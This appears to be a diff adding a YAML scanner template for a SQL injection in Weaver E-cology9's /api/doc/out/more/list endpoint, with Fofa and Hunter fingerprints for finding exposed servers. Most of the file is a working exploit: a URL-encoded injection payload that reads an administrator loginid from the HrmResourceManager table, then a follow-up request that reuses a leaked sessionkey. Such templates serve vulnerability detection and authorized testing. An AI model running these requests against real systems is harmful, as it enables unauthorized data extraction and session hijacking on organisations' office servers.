@@ -1,0 +1,38 @@
+id: weaver-ecology-api-doc-out-more-list-sqli
+
+info:
+  name: 泛微 E-cology9 /api/doc/out/more/list SQL注入
+  author: zan8in
+  severity: high
+  verified: false
+  description: |
+    Fofa: app="泛微-协同商务系统"
+    hunter: app.name=="泛微 e-cology 9.0 OA"
+  reference:
+    - https://1diot9.github.io/2026/05/13/泛微e9分析思路/#测绘指纹
+  tags: weaver,ecology,api,doc,out,more,list,sqli
+  created: 2026/05/25
+
+rules:
+  r0:
+    request:
+      method: GET
+      path: /api/doc/out/more/list?isNew=1&elementmore=%7B%22srcType%22%3A%20%222%22%2C%20%22srcContent%22%3A%20%22%2A%2F%3D%28%28-1%22%2C%20%22perpage%22%3A%20%2210%22%7D&docarchivedatefrom=a%27OR-1%2F%2Aa&doccreatedatefrom=%2A%2F%3D%28%2F%2Aa&doclastmoddatefrom=%2A%2FSELECT-3%2Blocate%2F%2A&docarchivedateto=%2A%2F%28hex%28SUBSTRING%28%2F%2A&doccreatedateto=%2A%2Floginid%2C1%2C1%29%29%2C%27073%27%29%20%2F%2A&doclastmoddateto=%2A%2Ffrom%20HrmResourceManager%20limit%200%2C1%29%20OR-1%2F%2A
+    expression: |
+      response.status == 200 &&
+      "\"sessionkey\":\".+\"".bmatches(response.body) &&
+      response.body.bcontains(b'"useType":"sql"')
+    output:
+      search: '"\"sessionkey\":\"(?P<sessionkey>.+)\",".bsubmatch(response.body)'
+      sessionkey: search["sessionkey"]
+  r1:
+    request:
+      method: POST
+      path: /api/ec/dev/table/counts
+      body: |
+        dataKey={{sessionkey}}
+    expression: |
+      response.status == 200 &&
+      response.body.bcontains(b'"status":true') &&
+      response.body.bcontains(b'"count":')
+expression: r0() && r1()
